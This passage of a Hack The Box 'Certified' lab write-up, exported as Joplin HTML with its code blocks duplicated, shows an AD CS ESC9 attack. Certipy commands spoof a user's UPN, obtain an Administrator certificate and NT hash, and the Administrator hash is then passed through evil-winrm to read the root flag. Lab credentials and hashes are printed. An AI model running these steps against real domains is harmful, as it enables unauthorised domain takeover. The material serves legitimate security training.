+        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
+    [!] Vulnerabilities
+      ESC9                              : Template has no security extension.
+    [*] Remarks
+      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.</code></pre></div>
+<p>When checking the criteria for this attack against this <a data-from-md="" title="https://www.hackingarticles.in/adcs-esc9-no-security-extension/" href="https://www.hackingarticles.in/adcs-esc9-no-security-extension/">article</a>, it matches well. We can use the <code class="inline-code">management_svc</code> to perform the spoofing UPN of proxy account. I ran the following commands:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad account update -u management_svc@certified.htb -hashes &apos;a091c1832bcdd4677c28b5a6a1295584&apos; -user ca_operator -upn Administrator -dc-ip 10.129.231.186
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user &apos;ca_operator&apos;:
+    userPrincipalName                   : Administrator
+[*] Successfully updated &apos;ca_operator&apos;
+
+....SNIP....
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad req -u ca_operator@certified.htb -password &apos;newP@ssword2022&apos; -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186 -sid &apos;S-1-5-21-729746778-2675978091-3820388244-500&apos;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;Administrator&apos;
+[*] Certificate has no object SID
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+File &apos;administrator.pfx&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;
+
+...SNIP....
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad account update -u management_svc@certified.htb -hashes &apos;a091c1832bcdd4677c28b5a6a1295584&apos; -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186   
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user &apos;ca_operator&apos;:
+    userPrincipalName                   : ca_operator@certified.htb
+[*] Successfully updated &apos;ca_operator&apos;
+
+
+...SNIP...
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &apos;Administrator&apos;
+[*] Using principal: &apos;administrator@certified.htb&apos;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &apos;administrator.ccache&apos;
+File &apos;administrator.ccache&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to &apos;administrator.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;administrator&apos;
+[*] Got hash for &apos;administrator@certified.htb&apos;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad account update -u management_svc@certified.htb -hashes &apos;a091c1832bcdd4677c28b5a6a1295584&apos; -user ca_operator -upn Administrator -dc-ip 10.129.231.186
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user &apos;ca_operator&apos;:
+    userPrincipalName                   : Administrator
+[*] Successfully updated &apos;ca_operator&apos;
+
+....SNIP....
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad req -u ca_operator@certified.htb -password &apos;newP@ssword2022&apos; -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186 -sid &apos;S-1-5-21-729746778-2675978091-3820388244-500&apos;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with UPN &apos;Administrator&apos;
+[*] Certificate has no object SID
+[*] Saving certificate and private key to &apos;administrator.pfx&apos;
+File &apos;administrator.pfx&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to &apos;administrator.pfx&apos;
+
+...SNIP....
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad account update -u management_svc@certified.htb -hashes &apos;a091c1832bcdd4677c28b5a6a1295584&apos; -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186   
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user &apos;ca_operator&apos;:
+    userPrincipalName                   : ca_operator@certified.htb
+[*] Successfully updated &apos;ca_operator&apos;
+
+
+...SNIP...
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &apos;Administrator&apos;
+[*] Using principal: &apos;administrator@certified.htb&apos;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &apos;administrator.ccache&apos;
+File &apos;administrator.ccache&apos; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to &apos;administrator.ccache&apos;
+[*] Trying to retrieve NT hash for &apos;administrator&apos;
+[*] Got hash for &apos;administrator@certified.htb&apos;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</code></pre></div>
+<p>And I already have the Administrator&apos;s hash. Perform pass the hash to gain access to DC:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.231.186
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ evil-winrm -i certified.htb -u Administrator -H <span class="hljs-number">0</span>d5b49608bbce1751f708748f67e2d34
+                                        
+Evil-WinRM shell v3.<span class="hljs-number">9</span>
+                                        
+Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">quoting_detection_proc</span>&apos; <span class="hljs-title function_">for</span> <span class="hljs-title function_">module</span> <span class="hljs-title function_">Reline</span>
+                                        
+<span class="hljs-title function_">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
+                                        
+Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 <span class="hljs-number">2</span>:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">10.129</span>.<span class="hljs-number">231.186</span>
+   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">0.0</span>
+   <span class="hljs-keyword">Default</span> Gateway . . . . . . . . . : <span class="hljs-number">10.129</span>.<span class="hljs-number">0.1</span>
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre></div>
+<p>The <code class="inline-code">root.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; more root.txt
+8c3d262176b924c86a41632c3910402f
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </pre><pre class="hljs"><code>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cd</span> ..
+*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">cd</span> Desktop
+*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Desktop&gt; more root.txt
+<span class="hljs-number">8</span>c3d262176b924c86a41632c3910402f
+
+*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\Administrator\Desktop&gt; </code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
